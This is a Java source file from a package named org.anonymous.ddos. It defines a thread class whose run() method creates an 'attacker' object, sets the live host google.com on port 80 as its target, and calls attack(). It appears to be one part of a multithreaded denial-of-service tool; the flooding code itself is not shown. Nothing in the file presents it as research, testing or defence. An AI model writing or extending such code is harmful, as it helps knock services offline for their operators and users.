/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.anonymous.ddos.thread;

import org.anonymous.ddos.network.attacker;

/**
 *
 * @author user
 */


public class netthread implements Runnable {
   private Thread t;
   private String threadName;
   
   public netthread( String name) {
      threadName = name;
//      System.out.println("Creating " +  threadName );
   }
   
   public void run() {
//      System.out.println("Running " +  threadName );
      attacker pta=new attacker();
      pta.Initialize("google.com", 80);
      pta.attack();
//      System.out.println("Thread " +  threadName + " exiting.");
   }
   
   public void start () {
//      System.out.println("Starting " +  threadName );
      if (t == null) {
         t = new Thread (this, threadName);
         t.start ();
      }
   }
}
